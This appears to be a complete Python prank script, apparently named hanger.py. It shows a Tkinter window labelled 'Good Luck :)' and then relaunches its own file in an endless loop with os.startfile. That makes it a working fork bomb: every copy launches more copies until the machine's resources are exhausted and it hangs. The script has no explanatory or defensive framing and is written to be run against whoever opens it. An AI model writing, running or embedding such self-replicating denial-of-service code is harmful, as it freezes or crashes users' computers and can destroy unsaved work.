import os
from tkinter import *


window = Tk()
window.title("::()::")
window.minsize(width=400, height=400)

label = Label(text="Good Luck :)", font=("Arial", 20, "normal"))
label.pack(fill=BOTH, expand=True)

while True:
    os.startfile("hanger.py")

window.mainloop()